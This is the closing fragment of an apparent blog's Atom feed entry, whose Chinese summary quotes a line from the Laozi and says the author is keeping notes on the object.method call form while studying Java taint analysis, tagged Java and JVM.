      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;知人者智，自知者明。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近在看Java污点分析，逃不开&lt;code&gt;对象.方法&lt;/code&gt;调用形式，做个记录，随时更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://fynch3r.github.io/categories/Java/"/>
    
    
      <category term="JVM" scheme="https://fynch3r.github.io/tags/JVM/"/>
    
  </entry>
  
</feed>
